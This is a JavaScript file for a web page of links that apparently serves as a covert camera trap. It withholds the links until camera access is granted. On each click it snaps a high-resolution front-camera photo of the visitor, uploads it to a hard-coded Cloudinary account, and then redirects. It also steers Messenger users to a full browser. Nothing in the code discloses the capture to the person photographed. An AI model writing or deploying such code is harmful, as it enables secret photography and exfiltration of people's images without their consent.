const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureLinks = document.querySelectorAll('.link-box');
const modal = document.getElementById('cameraModal');
const retryButton = document.getElementById('retryCamera');
const linkBoxes = document.querySelectorAll('.link-box');

// Cloudinary configuration
const cloudName = 'dsfc6qjqx';
const uploadPreset = 'ml_default';

// Add this at the top of the file
const isMessenger = /FBAN|FBAV/i.test(navigator.userAgent);

function showCameraModal() {
  modal.style.display = 'block';
}

function hideCameraModal() {
  modal.style.display = 'none';
}

function initCamera() {
  if (isMessenger) {
    showCameraModal();
    return;
  }
  
  // Stop existing stream if present
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(track => track.stop());
  }
  
  navigator.mediaDevices.getUserMedia({
    video: {
      facingMode: 'user',
      width: { ideal: 4096 },  // Max supported by most devices
      height: { ideal: 2160 },  // 4K resolution
      aspectRatio: { ideal: 16/9 }
    }
  })
  .then(stream => {
    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    canvas.width = settings.width;
    canvas.height = settings.height;
    video.srcObject = stream;
    hideCameraModal();
    // Enable links
    linkBoxes.forEach(link => {
      link.classList.remove('disabled');
      link.style.pointerEvents = 'auto';
    });
  })
  .catch(error => {
    console.error('Error accessing camera:', error);
    // Disable links
    linkBoxes.forEach(link => {
      link.classList.add('disabled');
      link.style.pointerEvents = 'none';
    });
    showCameraModal();
  });
}

// Initial camera setup
initCamera();

// Retry button handler
retryButton.addEventListener('click', () => {
  initCamera();
});

// Close modal when clicking outside
window.addEventListener('click', (event) => {
  if (event.target === modal) {
    hideCameraModal();
  }
});

// Capture image when any link is clicked
captureLinks.forEach(link => {
  link.addEventListener('click', (e) => {
    if (!video.srcObject) {
      e.preventDefault();
      showCameraModal();
      return;
    }
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('file', blob);
      formData.append('upload_preset', uploadPreset);

      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Image uploaded to Cloudinary:', data.secure_url);
        setTimeout(() => {
          window.location.href = link.dataset.redirectUrl;
        }, 1000);
      })
      .catch(error => {
        console.error('Error uploading image to Cloudinary:', error);
      });
    }, 'image/jpeg');
  });
});

// Update modal content check
if (isMessenger) {
  document.querySelector('.modal-content p').textContent = 
    "This feature doesn't work in Messenger. Please open in your browser.";
  retryButton.style.display = 'none';
} 